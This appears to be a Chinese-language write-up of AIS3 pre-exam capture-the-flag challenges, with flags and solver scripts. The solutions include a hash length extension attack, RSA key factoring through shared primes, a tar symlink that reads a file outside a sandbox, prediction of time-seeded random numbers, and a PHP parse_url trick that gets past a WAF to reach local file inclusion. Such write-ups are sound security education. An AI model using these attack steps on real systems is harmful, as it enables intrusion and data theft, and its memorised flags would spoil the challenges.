AIS3 pre-exam 簡單的 write-up
=============================

這次自己來亂入 AIS3 pre-exam，<br>
還是沒有好好了解看看 pwn 的東西很難過，連試都沒試Orz<br>
解的時間不夠 剩下的題目好難 Q_____Q<br>
破臺的大黑黑是神人啊啊啊

（順序按照我的解題順序）

希望這裡沒有什麼理解錯的地方 OTZ

## web1
Flag: `ais3{Y0u_beat_the_G00g1e!!}`

題目：
```
https://quiz.ais3.org:8011/
```

```
$ curl https://quiz.ais3.org:8011/
There is a secret page in these website. Even Google can not find it, can you?
```

看到指示便知道應該跟搜尋引擎相關，去翻翻 `robots.txt` 應該會有些什麼：

```
$ curl https://quiz.ais3.org:8011/robots.txt
User-agent: *
Disallow: /admin
Disallow: /cgi-bin/
Disallow: /images/
Disallow: /tmp/
Disallow: /private/
Disallow: /this_secret_page_you_should_not_know_where_it_is.php
```

最下面的位址感覺很奇怪！

```
$ curl https://quiz.ais3.org:8011/this_secret_page_you_should_not_know_where_it_is.php
ais3{Y0u_beat_the_G00g1e!!}
```

## misc1
Flag: `ais3{2016_^_^_hello_world!}`

題目：
```
Read the file!
(檔案) misc1.txt
```

檔案裡面就是 Flag 了Orz

```
$ curl https://pre-exam.ais3.org/files/misc1.txt
ais3{2016_^_^_hello_world!}
```

## web2
Flag: `ais3{admin's_pane1_is_on_fir3!!!!!}`

題目：
```
https://quiz.ais3.org:8012/
```

這題就比較有趣一點了呢，點開之後得知 flag 會顯示在 `panel.php` 上，不過一點開，就馬上被重導向到 `you_should_not_pass`。

![甘道夫表示](http://i.imgur.com/vxEY0vq.png)

到文字界面看看呢？

```
$ curl https://quiz.ais3.org:8012/panel.php

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Admin Panel</title>
</head>
<body>
Admin's secret is: ais3{admin's_pane1_is_on_fir3!!!!!}</body>
</html>
```

作人還是不要隨波逐流比較好（？），只要不跟著 302 就沒事了。

## crypto2
Flag: `ais3{HasH.eXtension.@tt@ck!}`

題目：
```
https://quiz.ais3.org:8014
```

這題就複雜很多了，不過幸好之前有看過，從原始碼我們可以得知是 Length Extension Attack，
因此和其他類似的題目相同，只要用 [hashpump](https://github.com/bwall/HashPump) 傳給他對的 payload 就好了。

從 `assert(strlen($secret) <= 60);` 我們可以知道 key 的長度不大於 60，所以我們就來試 60 以下的數字吧：

```python
#!/usr/bin/env python3
# AIS3 pre-exam crypto2 solver
# by pcchou <pcchou@pcchou.me>

from hashpumpy import hashpump
from requests import get
from urllib.parse import quote

orig = ('4c316ad79e9a61e4b70c482970a3a7f539cf4acd', 'expire=1467320162')

for i in range(60,0,-1):
    data = hashpump(orig[0], orig[1], "&expire=1500000000", i)
    print(get("https://quiz.ais3.org:8014/", params=quote(data[1] + b"&auth=" + data[0].encode('ascii'), safe="&=")).text.split("<code>")[0])
```

果不其然，Flag 就出現了：

```
$ python3 solve.py | grep ais3
<body><div id="flag">  ais3{HasH.eXtension.@tt@ck!}
```


## crypto3
Flag: `ais3{Euc1id3an_a1g0ri7hm_i5_u53fu1}`

題目：
```
RSA 2048
(檔案) rsa2048.tbz
```

這題又更怪了，壓縮檔打開來是一個被加密過的 `flag.enc`，還有一個資料夾 `pub`，裡面有 100 個 `.pub` 檔案。

```
$ cat pub/0.pub
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQBpzbNqgUDuMYh5JmhU21WJ
Hg+bJFBhbd6Jt0YZcYcspCPhpRgk9Vk7yDWsGUfZKjb/FjPc7stAIDoaMcXGoZG9
8k5mXYxsalVhplTJv2Aqy833qcXnK7u2y+VBSQpo+tzJ5yogCt9ymnGj78Peupi4
cEZA2mofU5yDjMwInsbjo1P1Wr8nHCCFqBw/6lS5RwBtyktW1AAF2Dgkm/r1mtkJ
eLG/7H04T/Yl/QyY2uPKs+f4T4ScasHprBhEv05LDlHzGMb/lJq/c0Mn9xKG1vZ3
+Vgoyb7KeV7PgeIS+l0jZt3yFWIhOEqNlAhmWlQkSvHwJtgmVLYEyyG4M9QTUh1v
AgQKsc4T
-----END PUBLIC KEY-----
```

從文字判斷我們就能知道這是一個 Public Key 檔案，根據我們的題目名稱，很有可能是 RSA 吧！

用 openssl 把其中一個拆拆看：

```
$ openssl rsa -noout -text -inform PEM -in pub/0.pub -pubin
Public-Key: (2047 bit)
Modulus:
    69:cd:b3:6a:81:40:ee:31:88:79:26:68:54:db:55:
    89:1e:0f:9b:24:50:61:6d:de:89:b7:46:19:71:87:
    2c:a4:23:e1:a5:18:24:f5:59:3b:c8:35:ac:19:47:
    d9:2a:36:ff:16:33:dc:ee:cb:40:20:3a:1a:31:c5:
    c6:a1:91:bd:f2:4e:66:5d:8c:6c:6a:55:61:a6:54:
    c9:bf:60:2a:cb:cd:f7:a9:c5:e7:2b:bb:b6:cb:e5:
    41:49:0a:68:fa:dc:c9:e7:2a:20:0a:df:72:9a:71:
    a3:ef:c3:de:ba:98:b8:70:46:40:da:6a:1f:53:9c:
    83:8c:cc:08:9e:c6:e3:a3:53:f5:5a:bf:27:1c:20:
    85:a8:1c:3f:ea:54:b9:47:00:6d:ca:4b:56:d4:00:
    05:d8:38:24:9b:fa:f5:9a:d9:09:78:b1:bf:ec:7d:
    38:4f:f6:25:fd:0c:98:da:e3:ca:b3:e7:f8:4f:84:
    9c:6a:c1:e9:ac:18:44:bf:4e:4b:0e:51:f3:18:c6:
    ff:94:9a:bf:73:43:27:f7:12:86:d6:f6:77:f9:58:
    28:c9:be:ca:79:5e:cf:81:e2:12:fa:5d:23:66:dd:
    f2:15:62:21:38:4a:8d:94:08:66:5a:54:24:4a:f1:
    f0:26:d8:26:54:b6:04:cb:21:b8:33:d4:13:52:1d:
    6f
Exponent: 179424787 (0xab1ce13)
```

哎呀，這指數好奇怪啊，不過好像也不影響，讓我們繼續看下去。

`flag.enc` 看起來也的確像是一般 RSA 加密的資料：

```
$ xxd flag.enc
00000000: 01b0 5660 3007 c2b4 5863 2f1b 292a ed80  ..V`0...Xc/.)*..
00000010: c434 0ac4 94a8 4d52 83ca aff0 6037 a130  .4....MR....`7.0
00000020: 03e6 9f66 75e5 1f14 8673 5b1c 2b55 4cb9  ...fu....s[.+UL.
00000030: 53b9 6f34 d1da d3d2 df46 4877 cd4e cf23  S.o4.....FHw.N.#
00000040: e5bd 0939 1206 ae2c ba21 98b3 daa6 b6fe  ...9...,.!......
00000050: 564c 65ec 8748 ca6d 0054 5b3f bfe7 7c88  VLe..H.m.T[?..|.
00000060: 7b08 f580 c45c 95c0 c293 fa83 9d8c 8aab  {....\..........
00000070: 566b 488a 1af5 a2b3 bb2c 5aaf 4dab 7964  VkH......,Z.M.yd
00000080: 573b e5aa 795b 802d 7014 bf63 ee89 2d43  W;..y[.-p..c..-C
00000090: 9c9e 405e 5994 18b3 3eb1 5861 a14a ea19  ..@^Y...>.Xa.J..
000000a0: c23a 9d96 2594 cf4a 64b3 76f4 b8be a07c  .:..%..Jd.v....|
000000b0: 1092 cebd f923 0b65 03af 498a 6e45 765d  .....#.e..I.nEv]
000000c0: 56f3 17ca c63d 884c e08e c53d aba9 977a  V....=.L...=...z
000000d0: 23c3 be56 44a3 1dca 9aa5 c3d2 e247 0dc2  #..VD........G..
000000e0: 449f bac4 8ce4 8053 bac3 76a2 cae0 5d59  D......S..v...]Y
000000f0: 5139 f754 a3ca 595c f719 6170 e4ae 9308  Q9.T..Y\..ap....
```

這時候該怎麼辦呢？想了很久之後，得到了一個可能就是：100 個公鑰的模數 中，萬一有共用的質因數呢？

先別管這個了，我們先來把所有公鑰的模數（modulus）都讀出來：

```
$ find -name '*.pub' -exec bash -c 'grep -v -- ----- {}| base64 -d | openssl asn1parse -inform DER -i -strparse 19' \; | grep 'hl=4' | grep 'INTEGER' | awk -F':' '{print $4}' > moduli # 把所有的 .pub 檔案 都讀出來，用 openssl 取出，再把不要的東西刪掉
$ wc -l moduli # 確定是 100 個沒有錯
100 moduli
```

繼續前面的話題，我們知道 RSA 加密會成立，其中必須要件是模數必須要是 ![p](http://latex.codecogs.com/png.latex?p) ![q](http://latex.codecogs.com/png.latex?q) 兩個很大的質數相乘構成。進行因數分解礦日費時，因此 ![p](http://latex.codecogs.com/png.latex?p) ![q](http://latex.codecogs.com/png.latex?q) 才不會被得知，也才能保證加密有效。

不過求公因數（判斷是否互質）就快多了，透過歐幾里得算法（輾轉相除法），電腦很快就可以求得大數與大數間的公因數，而公因數一定是其中一個的因數，要是這 100 個模數之間有公因數，那麼我們很快就可以求得，然後破解原先的明文。

接下來，打開 python，來試試看是不是這樣吧：

```python
>>> from json import loads
>>> from math import gcd
>>> with open('moduli', 'r') as f: moduli = f.readlines() # 讀出剛剛轉存的數值
...
>>> moduli = [int(x, 16) for x in moduli] # 轉成十進位
>>> for i in moduli:
...     for j in moduli:
...         if i==j: pass # 當兩個要測試的數字是同一個時略過
...         else:
...             if gcd(i, j) != 1: break # 當公因數不是 1 時跳出迴圈
...
>>> gcd(i, j) # 這兩個數字不是互質的！這代表我們能找出它們的 p、q 了
94554941196683181096147167112748782646379456332243826265219948331943489226411816615954261158176104318033927443521418310512513542643556191610222856229880344608095715694263847592386328690925789609017197867226771313386996125376588775009121140685049041198174496792411181801748521126593669280694145403319555977669
>>> i % gcd(i, j)
0
>>> j % gcd(i, j) # 的確是公因數沒錯，這個數字能夠同時整除 i 跟 j 這兩個公鑰的模數呢。
0
```

這下我們只要求出 p 和 q，再代回 RSA 解密的算式 ![t = c^e mod n](http://latex.codecogs.com/png.latex?t%20=%20c^{e}%20\\mod%20n)，就能得到解答了...？

```python
>>> from gmpy import invert # gmpy 這個 library 裡面有方便能直接 import 的求模反元素（modinv）函數，不過上網也很容易找到一樣的東西
>>> p = gcd(i, j)
>>> q = i // p # i = n = p * q，除回來
>>> d = int(invert(0xab1ce13, (p-1)*(q-1))) # 求模反元素 d
>>> from binascii import * # binascii 這個工具可以方便在 hex 跟字元之間轉換
>>> with open('flag.enc', 'rb') as f: ciphertext = int(hexlify(f.read()), 16) # 從 flag.enc 裡面讀出資料，轉成 int
>>> cleartext = pow(ciphertext, d, i) # t = c^e mod n
>>> unhexlify(format(cleartext, 'x'))
b'3\xd1\xf3\nD_\xd9\x16\xf8\xa5\x08\x83\xddHz"\x88N\xb3\x13\r%\x10\xafU\xeff\xdd\xf8\x13\xbf\x00\x84\x1e$ ]\xed\xd6\xe5\x80\xe2\x8fa\xe2\xb6{\xdbc\xbe4>\x89\xea\x19\xa6.\xdbV\x82\xa7\xf9c\x06 \x8d|\xb6\xd8\xceF|X\x90_:\x85\x02W\x13DuXpD\x02\xcb\xbeXv\xf9Y~\xb8\xfdGE\xc3>\x04\x11Z\x01\x8e2/\x914(\xbc\xe0\\7L\x86?\x0e\x98\xe5\'\xde\xff\xd3s1y\x0c,\xa4\x9b\xb6?\xc9v\xd4\xb5\xb6*\x94\xbd\xe5 \x11O\x94\x04\'1iN\xbd\xbd\xbc\'.aP\x1e\xb7S\xe9\x15\x9e8\xc6\xe7\xad\x88\xe8\x84\xefo9\xbc\xc2N\x97o\xfe\x9c\xdf\r\xe4\xb1Y\xfd\xf7W\xba\xa6N\x18\xe9\x15[Ik\xb6\xc0\xc2}\xfa\x9f\xfd\xcc3\xfbA\xb0\xff\xca;\x03c\x1c\xa9\'\x9e\x8fW\xbc\x00t?\xf2\xf9\\ ,,;Y\x8b\r:\x12\\\xd9@HB\xfe`=6\xe0Q\xe5\x89\x1b)\xb4E\x8di\x82'
```

疑？為什麼這樣還沒算出 flag 呢？

裡面有很多的公鑰，不過即使我們能夠分解它，只要 `flag.enc` 不是用它加密的，對我們都沒有用。<br>
因此我們需要嘗試求出每個公鑰的因數，看到底是哪一個可以成功把 `flag.enc` 解密。

```python
#!/usr/bin/env python3
# Solver for AIS3 pre-exam Crypto 3 - rsa2048
# by pcchou <pcchou@pcchou.me>

import json
from gmpy import gcd, invert
from binascii import *

with open('moduli', 'r') as f:
    moduli = f.readlines() # 讀出剛剛轉存的數值
moduli = [int(x, 16) for x in moduli] # 轉成十進位

with open('flag.enc', 'rb') as f:
    ciphertext = int(hexlify(f.read()), 16)

cleartext = b''

while b'ais3' not in cleartext:
    for i in moduli:
        for j in moduli:
            if i==j:
                pass
            else:
                p = gcd(i,j)
                if p != 1:
                    q = i // p
                    d = int(invert(0xab1ce13, (p-1)*(q-1)))
                    try:
                        cleartext = unhexlify(format(pow(ciphertext, d, i), 'x'))
                    except Error:
                        pass
                    break
else:
    print(cleartext)
```

於是 Flag 就出來囉：

```
$ time python solve.py
b'ais3{Euc1id3an_a1g0ri7hm_i5_u53fu1}'

real    0m5.283s
user    0m5.248s
sys     0m0.000s
```

## crypto1
Flag: `ais3{XoR_enCrYPtiON_15_n0t_a_G00d_idea}`

題目：
```
Read the file!
(檔案) crypto1
```

題目給的檔案是一個很長的一串 binary，乍看之下沒什麼意義<br>
一開始怎麼猜都猜不到，後來有了 XOR 這個有利提示便知道這是 XOR 加密的結果，運用 xortool 這個工具可以快速戳出答案：

```
$ xortool -o crypto1
The most probable key lengths:
   1:   10.6%
   3:   12.7%
   6:   11.6%
   9:   9.7%
  13:   13.7%
  15:   7.8%
  18:   6.9%
  21:   6.1%
  26:   8.1%
  39:   12.7%
Key-length can be 3*n
400 possible key(s) of length 13:
...
Found 0 plaintexts with 95.0%+ printable characters
See files filename-key.csv, filename-char_used-perc_printable.csv
$ xortool -o crypto1 -l 3 # 前面自動試的，最有可能的 key 長度 13 沒成功（沒有找到 95% 以上可讀的明文），換次之的 3
100 possible key(s) of length 3:
...
Found 0 plaintexts with 95.0%+ printable characters
See files filename-key.csv, filename-char_used-perc_printable.csv
$ xortool -o crypto1 -l 39 # 換 39
100 possible key(s) of length 39:
...
Found 59 plaintexts with 95.0%+ printable characters
See files filename-key.csv, filename-char_used-perc_printable.csv
$ grep -r ais3 xortool_out # 噹噹！來看看找到的結果裡面有些什麼
xortool_out/filename-key.csv:xortool_out/94.out;ais3{XoR_enCrYPtiON_15_n0t_a_G00d_i!ea}
```

果然 flag 就這樣出現了，不過立刻發現無法提交，原來後面的驚嘆號是個錯誤，改成 `ais3{XoR_enCrYPtiON_15_n0t_a_G00d_idea}` 就成功了！

## misc3
Flag: `ais3{First t1me 1$sc4pe tHE S4nd80x}`

題目：
```
telnet://quiz.ais3.org:9150
(檔案) misc3.py
```

這是一個有點神秘的題目，看了一下 code 之後發現他做的事情大概就是：

1. 先問要接下來讀取的長度
2. 讀入純文字的資料（不能是 binary，要 ascii，否則會 UnicodeEncodeError）
3. 把讀到的資料存成一個檔案
4. 用 `tar xf` 打開它
5. 讀當前目錄的 `flag.txt`，把它和 tar 解壓縮出來，裡面的 `guess.txt` 比較
6. 如果上一步比較相同，就噴出 `flag.txt` 給我們

前面純文字資料的部份，正好 tar 是個純文字的檔案格式，只要裡面也是純文字就不會有任何 ascii 無法編碼的資料出現，不打緊。

不過我們不知道 flag，要怎麼讓它比對成功呢？<br>
答案是透過 UNIX 下的檔案連結：symbolic link 的方式。

因為 tar 可以完整保存 UNIX 的檔案格式、權限（整個 inode 的參數），所以包括連結指向的東西也可以保留在內，解壓縮時也會重新展開。

我們只要在本地端建立一個指到 flag 的 symbolic link，然後再包到 tar 裡面，傳給主機，
它比較的就會實指同一個檔案，最後就會給我們 flag 了！

```
$ ln -s flag.txt guess.txt
$ ls -l guess.txt
lrwxrwxrwx 1 pcchou pcchou    8 Jul 13 02:23 guess.txt -> flag.txt
$ tar cf tarf guess.txt
$ cat tarf | wc -m | cat - tarf | nc quiz.ais3.org 9150
/usr/bin/sha1sum: ./tmpotzmg755/guess.txt: No such file or directory
Different.
Traceback (most recent call last):
  File "/home/misc/misc.py", line 30, in <module>
    b = subprocess.check_output(['/usr/bin/sha1sum', os.path.join(outdir, 'guess.txt')])
  File "/usr/lib/python3.4/subprocess.py", line 620, in check_output
    raise CalledProcessError(retcode, process.args, output=output)
subprocess.CalledProcessError: Command '['/usr/bin/sha1sum', './tmpotzmg755/guess.txt']' returned non-zero exit status 1
```

疑！竟然還是出現錯誤了，該怎麼辦呢？

看來是 symlink 沒有指到對的地方的關係，不過這個錯誤訊息透漏了一個蛛絲馬跡：<br>
我們的家目錄很有可能在 `/home/misc`！<br>
而因為前面已經有 `os.chdir(os.environ['HOME'])` 的關係，所以可以確定家目錄就是當前讀檔的目錄了，

所以只要把 symlink 改指到 `/home/misc/flag.txt` 就可以成功獲取 flag：

```
$ rm guess.txt
$ ln -s /home/misc/flag.txt guess.txt
$ ls -l guess.txt
lrwxrwxrwx 1 pcchou pcchou    8 Jul 13 02:46 guess.txt -> /home/misc/flag.txt
$ tar cf tarf guess.txt
$ cat tarf | wc -m | cat - tarf | nc quiz.ais3.org 9150
ais3{First t1me 1$sc4pe tHE S4nd80x}

```

## misc2
Flag: `ais3{7zzZzzzZzzZzZzzZiP}`

題目：
```
Read the file!
(檔案) UNPACK_ME
```

```
$ file UNPACK_ME
UNPACK_ME: data
$ xxd UNPACK_ME | head -n 8
00000000: 375a bcaf 271c 0003 97fa 34cd bf75 0400  7Z..'.....4..u..
00000010: 0000 0000 2400 0000 0000 0000 0f6d 9320  ....$........m.
00000020: 7fc7 1bd6 3232 8b34 c4a3 bda1 35ff 1bfe  ....22.4....5...
00000030: 7606 9e02 4b37 0f8a 77d6 0fba c7d4 3364  v...K7..w.....3d
00000040: 71f1 cc64 a788 ee07 1d2e 4e63 da79 3394  q..d......Nc.y3.
00000050: 9dc3 16d0 e647 7f52 b7a1 647c fbc4 2742  .....G.R..d|..'B
00000060: 8e22 2d36 6608 bb4a ce54 68eb c037 efd2  ."-6f..J.Th..7..
00000070: c22d 25a9 f93f 64f2 2858 0884 04ea 3691  .-%..?d.(X....6.
```

從檔案的開頭我們就能知道這是一個 7z 壓縮檔，不過第二個字元從小寫的 `z` 被改成了大寫的 `Z`，所以沒有被判斷成 7z 檔案，我們用 hex 編輯器把它改成小寫試看看：

```
$ file UNPACK_ME
UNPACK_ME: 7-zip archive data, version 0.3
```

解壓縮之後會找到 `UDJRRDVRJyfbWBxEMLEX` 和 `tArdCNLMPjLxqs5USx3T` 兩個檔案（後者被密碼保護），

隨便猜一猜之後發現前者的檔名就是後者的密碼，而 `tArdCNLMPjLxqs5USx3T` 也是個檔頭被修改的 7z 檔，把檔頭修正之後繼續拆拆拆。

打開 `tArdCNLMPjLxqs5USx3T` 也需要密碼，倒不用擔心，同樣是 `UDJRRDVRJyfbWBxEMLEX`，不過這次的檔案結構有點特別：

```
secret.txt
GkBBGdDtgCbEaSxRL4Bv
```

`GkBBGdDtgCbEaSxRL4Bv`  這個檔案是一樣的鬼東東，修正檔頭後，果然也需要密碼。<br>
這次 `UDJRRDVRJyfbWBxEMLEX` 就不能用了，不過這裡有神秘的 `secret.txt`，打開來正好是一串類似的字串：`SoN22wMNyesMfArxkKaF`，當然也就是我們的密碼。

於是拆開來後發現結構一樣：

```
wh3P5G6bS6NBHydRUrCr
secret.txt
```

這下可好！不知道要重複多少遍了，我們乾脆 script 來跑吧！

```bash
while true; do
    filename=$(7za x $filename -y -p$(cat secret.txt) | tee /dev/fd/2 | grep 'Extracting' | grep -v 'secret.txt' | awk '{print $2}')
    printf 'z' | dd of=$filename bs=1 seek=1 count=1 conv=notrunc # 把第二個 byte （count 從零開始）改成小寫 z
done
```
（請先指定一個可以正確解壓縮的壓縮檔 `filename` 給它（例如 `wh3P5G6bS6NBHydRUrCr`）

跑了快一千次上下就會解出一個壓縮檔只有 `flag.txt` 這個檔案而無法繼續跑下去，打開來當然就是我們要的東西：
```
azs3{7zzZzzzZzzZzZzzZiP}
```

修正為正確的格式（`ais3{7zzZzzzZzzZzZzzZiP}`）就是 flag 了。

## binary1
Flag: `ais3{readING_ASSemblY_4_FUN!}`

題目：
```
Read the binary!
(檔案) rev
```

這題好麻煩喔，我要先上解題 script：

```python
#!/usr/bin/env python3

from binascii import *
encrypted = unhexlify("ca7093c8067f23a1e0482a39ae54f279f2848b05a2521929c454aaf0ca")

for i, d in enumerate(encrypted):
   for a in range(0x20, 0x7F):
         if ((((i ^ a) << ((i ^ 9) & 3)) | ((i ^ a) >> (8 - ((i ^ 9) & 3)))) + 8) & 0xFF == d:
             print(chr(a), end='')
             break
```

```
$ python solve.py
ais3{readING_ASSemblY_4_FUN!}
```

## remote1
Flag: `ais3{sEEd_is_cRiTiCaL_@_@}`

題目：
```
telnet quiz.ais3.org 2154
(檔案) remote1
```

以 IDA Pro 拆開 `remote1` 之後，不用多久就可以看出這是一個先產生亂數，和使用者輸入比較是否一致，才會噴出 flag 的程式。

![remote1 pseudocode](http://i.imgur.com/ydj67S8.png)

比較特別的是下面在比對的是 ( 隨機數字 ^ 輸入數字 == 538354003 ），而不是單純的猜亂數，在之後解題的時候需要注意一點。

回到正題，而我們要怎麼猜出那個數字是什麼，一次就成功答對呢？

我們可以看到前面的 `srand()` 那邊，是以 `time(0)` 作為產生偽亂數的種子碼，因為 `glibc` 的實做方式都是一樣的（Linear Congruential Generator；LCG），所以只要在跟主機同時 call `srand()` 函數，就會產生出一樣的「亂數」。

寫寫 code：

```c
#include <stdio.h>
#include <time.h>
#include <stdlib.h>

int main(void)
{
 int number;
 srand(time(0));
 number = rand();
 printf("%d", number ^ 538354003);
 return 0;
}
```

再來：

```
$ gcc printrand.c -o printrand
$ chmod +x printrand
$ ./printrand | nc quiz.ais3.org 2154
Enter passcode: Correct!
ais3{sEEd_is_cRiTiCaL_@_@}
```

Flag 就出來囉！

（注意我這裡先前有透過 NTP 校時過，如果時間不對的話可能會因為些許時差而產生出不同的亂數。）

## binary3
Flag: `ais3{a XOR b XOR 1oo1l}`

題目：
```
Read the binary!
(檔案) caaaaalucate
```

用 angr..... 神奇的黑魔法 orz

程式會讀輸入然後再喂進 verify 驗證，我們要算出可以正確通過的輸入。

用 radare2 可以看出要想辦法跳過去的 address（Bingo），還有不該跳過去的 address（QQ）：

```
                      | call sym.imp.read ;[a]                       |
                      | lea rax, [rbp-local_14]                      |
                      | mov rdi, rax                                 |
                      | call sym.verify ;[b]                         |
                      | mov dword [rbp - 4], eax                     |
                      | cmp dword [rbp - 4], 1 ; [0x1:4]=0x2464c45   |
                      | jne 0x40247d ;[c]                            |
                      =----------------------------------------------=
                            t f
        .-------------------' '-------------------------.
        |                                               |
        |                                               |
  =---------------------------------------=     =-------------------------------------------=
  |  0x40247d                             |     |  0x402471                                 |
  | ; JMP XREF from 0x0040246f (sym.main) |     | mov edi, str.Bingo_ ; "Bingo!" @ 0x402514 |
  | mov edi, 0x40251b                     |     | call sym.imp.puts ;[d]                    |
  | call sym.imp.puts ;[d]                |     | jmp 0x402487 ;[e]                         |
  =---------------------------------------=     =-------------------------------------------=
      v                                             v
      '-----------------------.---------------------'
                              |
                              |
                          =---------------------------------------=
                          |  0x402487                             |
                          | ; JMP XREF from 0x0040247b (sym.main) |
                          | leave                                 |
                          | ret                                   |
                          =---------------------------------------=
```

find = 0x402471，avoid = 0x40247d，輸入 angr 讓他跑跑跑：

```python
>>> import angr
>>> p = angr.Project("caaaaalculate")
>>> ex = p.surveyors.Explorer(find=(0x402471, ), avoid=(0x40247d, ))
>>> ex.run()
<Explorer with paths: 0 active, 0 spilled, 0 deadended, 0 errored, 0 unconstrained, 1 found, 28 avoided, 0 deviating, 0 looping, 0 lost>
>>> ex.found[0]
<Path with 148 runs (at 0x402471)>
>>> ex.found[0].state.posix.dumps(0)
"ais3{a XOR b XOR 1oo1l}@@@@@@@"
```

一切交給外星科技，我連怎麼解的都不知道Orz

## web3
Flag: `ais3{haha!i_bypassed_the_fucking_waf!}`

題目：
```
https://quiz.ais3.org:8013
```

題目的 `download.php` 有 LFI 漏洞，可以讀 source，可是有加 waf filter（在 `../waf.php`），擋住含有 `flag` 的輸入，

這題利用了 PHP 5 的 `parse_url` 的一個漏洞（[https://bugs.php.net/bug.php?id=66813](https://bugs.php.net/bug.php?id=66813)），只要有 URL query string 有冒號+數字，就會讓 `parse_url` 直接噴出 `bool(false)`。<br>
這樣一來 `waf.php` 裡面 `stristr` 判斷的就只會是空字串，在 `download.php` 中卻可以拿到正確的 `$_GET['p']`。

（這個也是之後拆開才發現的，跟原本自己想的不一樣）

[https://quiz.ais3.org:8013/download.php?p=../flag.php:0](https://quiz.ais3.org:8013/download.php?p=../flag.php:0)
